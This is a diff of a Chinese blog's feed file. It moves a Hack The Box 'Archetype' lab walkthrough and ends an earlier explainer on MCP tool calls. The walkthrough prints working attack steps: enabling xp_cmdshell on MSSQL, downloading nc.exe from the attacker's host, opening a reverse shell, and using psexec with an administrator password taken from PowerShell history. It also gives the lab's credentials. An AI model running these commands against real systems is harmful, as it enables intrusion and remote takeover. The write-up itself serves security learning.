-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;call_tool&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tool&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fs.read_file&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/docs/intro.md&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>服务端会执行 <strong>read_file</strong> 并返回文件内容。</p>
-<p>模型可以继续请求：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;call_tool&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tool&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fs.write_file&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/docs/notes.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;这里是我总结的内容...&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>这里体现 MCP 的本质：</p>
-<ul>
-<li>模型知道有哪些工具可用</li>
-<li>模型直接“操控”这些工具</li>
-<li>具有类似“文件读写”等复杂能力</li>
-<li>不需要开发者提前硬编码所有函数</li>
-</ul>
-<h2 id="⭐小结"><a href="#⭐小结" class="headerlink" title="⭐小结"></a>⭐小结</h2><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>维度</th>
-<th>Function Call</th>
-<th>MCP</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>工具发现</td>
-<td>手工定义</td>
-<td>自动注册，模型可自动学习工具能力</td>
-</tr>
-<tr>
-<td>调用方式</td>
-<td>结构化 JSON</td>
-<td>双向协议、消息通信</td>
-</tr>
-<tr>
-<td>扩展性</td>
-<td>每加一个功能都要新增函数定义</td>
-<td>新增 MCP 服务即可扩展工具能力</td>
-</tr>
-<tr>
-<td>模型能力</td>
-<td>被动</td>
-<td>主动、可规划调用流程</td>
-</tr>
-<tr>
-<td>场景</td>
-<td>简单 API 调用、数据结构化</td>
-<td>IDE、数据库集成、文件系统、GitHub 操作、企业自动化</td>
-</tr>
-</tbody>
-</table>
-</div>
-]]></content>
-      <categories>
-        <category>MCP</category>
-      </categories>
-      <tags>
-        <tag>MCP</tag>
       </tags>
   </entry>
   <entry>
@@ -1167,6 +1167,44 @@
       </tags>
   </entry>
   <entry>
+    <title>Hackthebox-StartingPoint-Tier2-Archetype</title>
+    <url>/2026/05/17/Hackthebox-StartingPoint-Tier2-Archetype/</url>
+    <content><![CDATA[<p>第二层级是“StartingPoint”中的最高层级，包含功能齐全的机器，需要用户串联多个攻击步骤才能成功入侵。用户必须进行彻底的枚举，获取初始立足点，然后逐步提升权限至 root 或系统级别。与之前的层级不同，第二层级中的每台机器都包含两个标志——一个用于用户，一个用于 root/系统——这模拟了真实的渗透测试场景，需要更全面的方法。</p>
+<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --min-rate 5000 10.129.129.122</span><br><span class="line">smbclient -L 10.129.129.122</span><br><span class="line"><span class="built_in">sudo</span> smbclient \\\\10.129.129.122\\backups</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">get prod.dtsConfig</span><br><span class="line">Password=M3g4c0rp123</span><br><span class="line"><span class="built_in">cd</span> /usr/share/doc/python3-impacket/examples/</span><br><span class="line">python mssqlclient.py -h</span><br><span class="line"><span class="built_in">sudo</span> python mssqlclient.py ARCHETYPE/sql_svc@10.129.129.122 -windows-auth</span><br><span class="line">SELECT is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c pwd&#x27;</span></span><br><span class="line">C:\Windows\system32</span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe</span><br><span class="line">ip a</span><br><span class="line">tun0: 10.10.14.92</span><br><span class="line"><span class="built_in">sudo</span> python -m http.server 80 </span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc64.exe -outfile nc64.exe&#x27;</span></span><br><span class="line">nc -nvlp 443</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.92 443&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; dir&#x27;</span></span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc.exe -outfile nc.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; dir&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.92 443&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; ls C:\Users\sql_svc\Downloads\nc.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.92 4443&#x27;</span></span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=<span class="literal">true</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;nc64.exe?raw=true&#x27;</span> nc2.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc2.exe -outfile nc2.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc2.exe -e cmd.exe 10.10.14.92 4443&#x27;</span></span><br><span class="line">C:\Users\sql_svc\Downloads&gt;<span class="built_in">type</span> user.txt</span><br><span class="line">wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe?raw=<span class="literal">true</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;winPEASx64.exe?raw=true&#x27;</span> winPEASx64.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/winPEASx64.exe -outfile winPEASx64.exe&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line"><span class="built_in">type</span> ConsoleHost_history.txt</span><br><span class="line">administrator MEGACORP_4dm1n!!</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line"><span class="built_in">cd</span> C:\Users\Administrator\Desktop</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br></pre></td></tr></table></figure>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1.Which TCP port is hosting a database server? </p>
+<p>1433</p>
+<p>2.What is the name of the non-Administrative share available over SMB?</p>
+<p>backups</p>
+<p>3.What is the password identified in the file on the SMB share?</p>
+<p>M3g4c0rp123</p>
+<p>4.What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</p>
+<p>mssqlclient.py</p>
+<p>5.What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</p>
+<p>xp_cmdshell</p>
+<p>6.What script can be used in order to search possible paths to escalate privileges on Windows hosts?</p>
+<p>WinPEAS</p>
+<p>7.What file contains the administrator’s password?</p>
+<p>ConsoleHost_history.txt</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>扩展存储过程 (Extended Stored Procedure): 在数据库里，”存储过程”就是一段提前写好的 SQL 代码。而”扩展存储过程”允许 MSSQL 数据库调用外部的动态链接库（DLL），这意味着数据库可以直接与底层的 Windows 操作系统进行交互。</p>
+<p>在现代的 MSSQL 版本（2005 之后）中，出于安全考虑，微软默认禁用了 xp_cmdshell。</p>
+<p>因此在实际的打靶或实战中，如果攻击者拥有极高的权限（如 SA），通常需要先执行几条特定的 SQL 语句把它重新开启，然后才能使用。开启命令通常如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 1. 允许修改高级配置</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">-- 2. 开启 xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">EXEC xp_cmdshell &#x27;net user&#x27;;</span><br></pre></td></tr></table></figure>
+<p>在github上下载的exe文件，如果不指定raw格式，则会下载整个文件，这是一个大的踩坑点：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<h2 id="详细记录"><a href="#详细记录" class="headerlink" title="详细记录"></a>详细记录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- --min-rate 5000 10.129.129.122</span><br><span class="line">[sudo] password for zyu:</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-13 09:00 EDT</span><br><span class="line">Warning: 10.129.129.122 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.129.129.122</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49668/tcp open  unknown</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line"></span><br><span class="line">smbclient -L 10.129.129.122</span><br><span class="line">Password for [WORKGROUP\zyu]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        backups         Disk</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 10.129.129.122 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br><span class="line">&lt;DTSConfiguration&gt;</span><br><span class="line">    &lt;DTSConfigurationHeading&gt;</span><br><span class="line">        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;</span><br><span class="line">    &lt;/DTSConfigurationHeading&gt;</span><br><span class="line">    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;</span><br><span class="line">        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;</span><br><span class="line">    &lt;/Configuration&gt;</span><br><span class="line">&lt;/DTSConfiguration&gt; </span><br><span class="line"></span><br><span class="line">Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</span><br><span class="line"></span><br><span class="line">sudo python mssqlclient.py ARCHETYPE/sql_svc@10.129.129.122 -windows-auth</span><br><span class="line">[sudo] password for zyu:</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt;</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; xp_cmdshell ‘net user’;</span><br><span class="line">ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure &#x27;sys.xp_cmdshell&#x27; of component &#x27;xp_cmdshell&#x27; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of &#x27;xp_cmdshell&#x27; by using sp_configure. For more information about enabling &#x27;xp_cmdshell&#x27;, search for &#x27;xp_cmdshell&#x27; in SQL Server Books Online.</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; SELECT is_srvrolemember(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">-</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">INFO(ARCHETYPE): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">INFO(ARCHETYPE): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC xp_cmdshell &#x27;net user&#x27;;</span><br><span class="line">output</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">User accounts for \\ARCHETYPE</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line"></span><br><span class="line">sql_svc                  WDAGUtilityAccount</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line"># 稳定反向shell获取</span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=true</span><br><span class="line">mv &#x27;nc64.exe?raw=true&#x27; nc2.exe</span><br><span class="line">EXEC xp_cmdshell &#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc2.exe -outfile nc2.exe&#x27;</span><br><span class="line">EXEC xp_cmdshell &#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc2.exe -e cmd.exe 10.10.14.92 4443&#x27;</span><br><span class="line">C:\Users\sql_svc\Downloads&gt;</span><br><span class="line">C:\Users\sql_svc\Desktop&gt;type user.txt</span><br><span class="line">type user.txt</span><br><span class="line"></span><br><span class="line">    PowerShell Settings</span><br><span class="line">    PowerShell v2 Version: 2.0</span><br><span class="line">    PowerShell v5 Version: 5.1.17763.1</span><br><span class="line">    PowerShell Core Version:</span><br><span class="line">    Transcription Settings:</span><br><span class="line">    Module Logging Settings:</span><br><span class="line">    Scriptblock Logging Settings:</span><br><span class="line">    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">    PS history size: 79B</span><br><span class="line"></span><br><span class="line">Analyzing Windows Files Files (limit 70)</span><br><span class="line">    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">    C:\Users\Default\NTUSER.DAT</span><br><span class="line">    C:\Users\sql_svc\NTUSER.DAT</span><br><span class="line"></span><br><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">C:\Users\sql_svc\Downloads&gt;cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line">cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line"></span><br><span class="line">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 9565-0B4F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</span><br><span class="line"></span><br><span class="line">01/20/2020  06:04 AM    &lt;DIR&gt;          .</span><br><span class="line">01/20/2020  06:04 AM    &lt;DIR&gt;          ..</span><br><span class="line">03/17/2020  02:36 AM                79 ConsoleHost_history.txt</span><br><span class="line">               1 File(s)             79 bytes</span><br><span class="line">               2 Dir(s)  10,754,007,040 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;type ConsoleHost_history.txt</span><br><span class="line">type ConsoleHost_history.txt</span><br><span class="line">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!</span><br><span class="line">exit</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.129.95.187.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file hvfcrhtO.exe</span><br><span class="line">[*] Opening SVCManager on 10.129.95.187.....</span><br><span class="line">[*] Creating service aWaI on 10.129.95.187.....</span><br><span class="line">[*] Starting service aWaI.....</span><br><span class="line">[!] Press help for extra shell commands                                                                                                                        Microsoft Windows [Version 10.0.17763.2061]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; cd C:\Users\Administrator\Desktop</span><br><span class="line">C:\Users\Administrator\Desktop&gt; dir                                                                                                                             Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 9565-0B4F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">07/27/2021  02:30 AM    &lt;DIR&gt;          .</span><br><span class="line">07/27/2021  02:30 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/25/2020  07:36 AM                32 root.txt</span><br><span class="line">               1 File(s)             32 bytes</span><br><span class="line">               2 Dir(s)  10,328,911,872 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; type root.txt </span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>HTB</tag>
+        <tag>Penetration Testing</tag>
+        <tag>mssql</tag>
+        <tag>xp_cmdshell</tag>
+        <tag>nc.exe</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hackthebox-StartingPoint-Tier1</title>
     <url>/2026/05/17/Hackthebox-StartingPoint-Tier1/</url>
     <content><![CDATA[<p>Tier1引入基础的漏洞利用技术略微增加了难度。</p>
@@ -1351,44 +1389,6 @@
         <tag>responder</tag>
         <tag>ffuf</tag>
         <tag>s3，php-reverse-shell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hackthebox-StartingPoint-Tier2-Archetype</title>
-    <url>/2026/05/17/Hackthebox-StartingPoint-Tier2-Archetype/</url>
-    <content><![CDATA[<p>第二层级是“StartingPoint”中的最高层级，包含功能齐全的机器，需要用户串联多个攻击步骤才能成功入侵。用户必须进行彻底的枚举，获取初始立足点，然后逐步提升权限至 root 或系统级别。与之前的层级不同，第二层级中的每台机器都包含两个标志——一个用于用户，一个用于 root/系统——这模拟了真实的渗透测试场景，需要更全面的方法。</p>
-<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --min-rate 5000 10.129.129.122</span><br><span class="line">smbclient -L 10.129.129.122</span><br><span class="line"><span class="built_in">sudo</span> smbclient \\\\10.129.129.122\\backups</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">get prod.dtsConfig</span><br><span class="line">Password=M3g4c0rp123</span><br><span class="line"><span class="built_in">cd</span> /usr/share/doc/python3-impacket/examples/</span><br><span class="line">python mssqlclient.py -h</span><br><span class="line"><span class="built_in">sudo</span> python mssqlclient.py ARCHETYPE/sql_svc@10.129.129.122 -windows-auth</span><br><span class="line">SELECT is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c pwd&#x27;</span></span><br><span class="line">C:\Windows\system32</span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe</span><br><span class="line">ip a</span><br><span class="line">tun0: 10.10.14.92</span><br><span class="line"><span class="built_in">sudo</span> python -m http.server 80 </span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc64.exe -outfile nc64.exe&#x27;</span></span><br><span class="line">nc -nvlp 443</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.92 443&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; dir&#x27;</span></span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc.exe -outfile nc.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; dir&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.92 443&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; ls C:\Users\sql_svc\Downloads\nc.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.92 4443&#x27;</span></span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=<span class="literal">true</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;nc64.exe?raw=true&#x27;</span> nc2.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc2.exe -outfile nc2.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc2.exe -e cmd.exe 10.10.14.92 4443&#x27;</span></span><br><span class="line">C:\Users\sql_svc\Downloads&gt;<span class="built_in">type</span> user.txt</span><br><span class="line">wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe?raw=<span class="literal">true</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;winPEASx64.exe?raw=true&#x27;</span> winPEASx64.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/winPEASx64.exe -outfile winPEASx64.exe&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line"><span class="built_in">type</span> ConsoleHost_history.txt</span><br><span class="line">administrator MEGACORP_4dm1n!!</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line"><span class="built_in">cd</span> C:\Users\Administrator\Desktop</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br></pre></td></tr></table></figure>
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1.Which TCP port is hosting a database server? </p>
-<p>1433</p>
-<p>2.What is the name of the non-Administrative share available over SMB?</p>
-<p>backups</p>
-<p>3.What is the password identified in the file on the SMB share?</p>
-<p>M3g4c0rp123</p>
-<p>4.What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</p>
-<p>mssqlclient.py</p>
-<p>5.What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</p>
-<p>xp_cmdshell</p>
-<p>6.What script can be used in order to search possible paths to escalate privileges on Windows hosts?</p>
-<p>WinPEAS</p>
-<p>7.What file contains the administrator’s password?</p>
-<p>ConsoleHost_history.txt</p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>扩展存储过程 (Extended Stored Procedure): 在数据库里，”存储过程”就是一段提前写好的 SQL 代码。而”扩展存储过程”允许 MSSQL 数据库调用外部的动态链接库（DLL），这意味着数据库可以直接与底层的 Windows 操作系统进行交互。</p>
-<p>在现代的 MSSQL 版本（2005 之后）中，出于安全考虑，微软默认禁用了 xp_cmdshell。</p>
-<p>因此在实际的打靶或实战中，如果攻击者拥有极高的权限（如 SA），通常需要先执行几条特定的 SQL 语句把它重新开启，然后才能使用。开启命令通常如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 1. 允许修改高级配置</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">-- 2. 开启 xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">EXEC xp_cmdshell &#x27;net user&#x27;;</span><br></pre></td></tr></table></figure>
-<p>在github上下载的exe文件，如果不指定raw格式，则会下载整个文件，这是一个大的踩坑点：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
